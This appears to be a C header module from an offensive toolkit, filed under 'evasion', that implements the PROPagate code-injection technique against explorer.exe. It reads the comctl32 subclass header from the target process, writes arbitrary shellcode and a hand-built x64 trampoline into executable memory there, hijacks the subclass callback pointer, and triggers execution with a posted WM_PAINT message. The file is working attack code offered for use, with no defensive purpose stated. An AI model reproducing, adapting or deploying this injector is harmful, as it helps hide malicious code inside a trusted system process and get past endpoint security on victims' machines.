// chunk: evasion/propagate_inject
// depends: (none)
// provides: propagate_inject
// headers: windows.h
// risk: medium
// note: PROPagate injection — abuses the SetProp/GetProp window property mechanism
//       to hijack UxSubclassInfo or CC32SubclassInfo callback structures. When the
//       target window processes a message (e.g., WM_PAINT), the subclass procedure
//       dispatches through the callback table we modified, executing our code.
//       No thread creation, no APC, no remote thread context manipulation.
//       Based on research by Hexacorn (PROPagate technique).

#ifndef CHUNK_PROPAGATE_INJECT
#define CHUNK_PROPAGATE_INJECT

#include <windows.h>
#include <tlhelp32.h>

/*
 * SUBCLASS_HEADER and SUBCLASS_CALL represent the internal structures
 * used by comctl32 for window subclassing (UxSubclassInfo property).
 *
 * When comctl32 processes messages for a subclassed window, it walks the
 * SUBCLASS_CALL chain and calls each pfnSubclass callback. By replacing
 * the pfnSubclass pointer with our shellcode address, we get execution
 * when a message is dispatched.
 */

/* comctl32 internal subclass structures (reverse-engineered) */
#pragma pack(push, 1)
typedef struct _SUBCLASS_CALL {
    PVOID       pfnSubclass;     /* Callback function pointer — our target */
    ULONG_PTR   uIdSubclass;
    DWORD_PTR   dwRefData;
} SUBCLASS_CALL;

typedef struct _SUBCLASS_HEADER {
    UINT        uRefs;
    UINT        uAlloc;
    UINT        uCleanup;
    DWORD       dwThreadId;
    SUBCLASS_CALL CallArray[1];  /* Variable-length array */
} SUBCLASS_HEADER;
#pragma pack(pop)

static DWORD _pr_find_target_pid(void) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

/* Callback for EnumWindows to find a window with UxSubclassInfo */
typedef struct _PROP_SEARCH_CTX {
    DWORD target_pid;
    HWND  found_hwnd;
} PROP_SEARCH_CTX;

static BOOL CALLBACK _pr_enum_windows(HWND hwnd, LPARAM lParam) {
    PROP_SEARCH_CTX *ctx = (PROP_SEARCH_CTX *)lParam;

    DWORD wnd_pid = 0;
    GetWindowThreadProcessId(hwnd, &wnd_pid);

    if (wnd_pid != ctx->target_pid)
        return TRUE;  /* continue enumeration */

    /* Check if this window has the UxSubclassInfo property */
    HANDLE prop = GetPropA(hwnd, "UxSubclassInfo");
    if (!prop) {
        /* Try CC32SubclassInfo (older comctl32 versions) */
        prop = GetPropA(hwnd, "CC32SubclassInfo");
    }

    if (prop) {
        ctx->found_hwnd = hwnd;
        return FALSE;  /* stop enumeration */
    }

    return TRUE;
}

/*
 * propagate_inject: Inject code via PROPagate technique.
 *
 * code:      shellcode / position-independent code
 * code_size: size in bytes
 *
 * 1. Find explorer.exe window with UxSubclassInfo property
 * 2. Read the SUBCLASS_HEADER from the target process
 * 3. Allocate + write shellcode in target process
 * 4. Modify the pfnSubclass pointer to point to shellcode
 * 5. Write modified header back
 * 6. Send a message to trigger the callback
 *
 * Returns 1 on success, 0 on failure.
 */
static int propagate_inject(BYTE *code, DWORD code_size) {
    DWORD pid = _pr_find_target_pid();
    if (!pid) return 0;

    /* Find a window with UxSubclassInfo */
    PROP_SEARCH_CTX search = {0};
    search.target_pid = pid;
    search.found_hwnd = NULL;
    EnumWindows(_pr_enum_windows, (LPARAM)&search);

    if (!search.found_hwnd) return 0;

    HANDLE hProc = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
        FALSE, pid);
    if (!hProc) return 0;

    /* Get the UxSubclassInfo property value — this is a pointer to
       SUBCLASS_HEADER in the target process's address space */
    HANDLE prop_val = GetPropA(search.found_hwnd, "UxSubclassInfo");
    if (!prop_val) {
        prop_val = GetPropA(search.found_hwnd, "CC32SubclassInfo");
    }
    if (!prop_val) {
        CloseHandle(hProc);
        return 0;
    }

    /* Read the SUBCLASS_HEADER from the target process */
    SUBCLASS_HEADER header;
    SIZE_T bytes_read;
    if (!ReadProcessMemory(hProc, (PVOID)prop_val, &header, sizeof(header), &bytes_read)) {
        CloseHandle(hProc);
        return 0;
    }

    /* Allocate memory in target for our shellcode */
    PVOID remote_code = VirtualAllocEx(hProc, NULL, code_size,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);
    if (!remote_code) {
        CloseHandle(hProc);
        return 0;
    }

    /* Write shellcode to target */
    SIZE_T written;
    WriteProcessMemory(hProc, remote_code, code, code_size, &written);

    /* Change protection to RX */
    DWORD old_prot;
    VirtualProtectEx(hProc, remote_code, code_size, PAGE_EXECUTE_READ, &old_prot);

    /* Save original callback pointer for restoration */
    PVOID original_callback = header.CallArray[0].pfnSubclass;

    /* Build a trampoline that:
       1. Calls our shellcode
       2. Restores the original callback
       3. Jumps to the original callback
       This prevents crashes after our code runs. */
    BYTE trampoline[128];
    SIZE_T t_off = 0;

    /* push registers */
    trampoline[t_off++] = 0x50;  /* push rax */
    trampoline[t_off++] = 0x51;  /* push rcx */
    trampoline[t_off++] = 0x52;  /* push rdx */
    trampoline[t_off++] = 0x41; trampoline[t_off++] = 0x50;  /* push r8 */
    trampoline[t_off++] = 0x41; trampoline[t_off++] = 0x51;  /* push r9 */
    trampoline[t_off++] = 0x48; trampoline[t_off++] = 0x83;
    trampoline[t_off++] = 0xEC; trampoline[t_off++] = 0x28;  /* sub rsp, 0x28 */

    /* call shellcode */
    trampoline[t_off++] = 0x48; trampoline[t_off++] = 0xB8;
    *(ULONGLONG *)(trampoline + t_off) = (ULONGLONG)remote_code; t_off += 8;
    trampoline[t_off++] = 0xFF; trampoline[t_off++] = 0xD0;  /* call rax */

    /* Restore the original pfnSubclass pointer in the SUBCLASS_HEADER:
       mov rax, &header.CallArray[0].pfnSubclass
       mov rcx, original_callback
       mov [rax], rcx */
    trampoline[t_off++] = 0x48; trampoline[t_off++] = 0xB8;
    *(ULONGLONG *)(trampoline + t_off) = (ULONGLONG)((BYTE *)prop_val +
        offsetof(SUBCLASS_HEADER, CallArray[0].pfnSubclass)); t_off += 8;
    trampoline[t_off++] = 0x48; trampoline[t_off++] = 0xB9;
    *(ULONGLONG *)(trampoline + t_off) = (ULONGLONG)original_callback; t_off += 8;
    trampoline[t_off++] = 0x48; trampoline[t_off++] = 0x89;
    trampoline[t_off++] = 0x08;  /* mov [rax], rcx */

    /* pop registers */
    trampoline[t_off++] = 0x48; trampoline[t_off++] = 0x83;
    trampoline[t_off++] = 0xC4; trampoline[t_off++] = 0x28;  /* add rsp, 0x28 */
    trampoline[t_off++] = 0x41; trampoline[t_off++] = 0x59;  /* pop r9 */
    trampoline[t_off++] = 0x41; trampoline[t_off++] = 0x58;  /* pop r8 */
    trampoline[t_off++] = 0x5A;  /* pop rdx */
    trampoline[t_off++] = 0x59;  /* pop rcx */
    trampoline[t_off++] = 0x58;  /* pop rax */

    /* jmp to original callback */
    trampoline[t_off++] = 0x48; trampoline[t_off++] = 0xB8;
    *(ULONGLONG *)(trampoline + t_off) = (ULONGLONG)original_callback; t_off += 8;
    trampoline[t_off++] = 0xFF; trampoline[t_off++] = 0xE0;  /* jmp rax */

    /* Allocate and write trampoline */
    PVOID remote_tramp = VirtualAllocEx(hProc, NULL, t_off,
                                         MEM_COMMIT | MEM_RESERVE,
                                         PAGE_EXECUTE_READWRITE);
    if (!remote_tramp) {
        VirtualFreeEx(hProc, remote_code, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 0;
    }
    WriteProcessMemory(hProc, remote_tramp, trampoline, t_off, &written);
    VirtualProtectEx(hProc, remote_tramp, t_off, PAGE_EXECUTE_READ, &old_prot);

    /* Overwrite the pfnSubclass in the SUBCLASS_HEADER to point to our trampoline */
    header.CallArray[0].pfnSubclass = remote_tramp;
    WriteProcessMemory(hProc, (PVOID)prop_val, &header, sizeof(header), &written);

    CloseHandle(hProc);

    /* Trigger the callback by sending a message to the window */
    PostMessageA(search.found_hwnd, WM_PAINT, 0, 0);

    return 1;
}

#endif
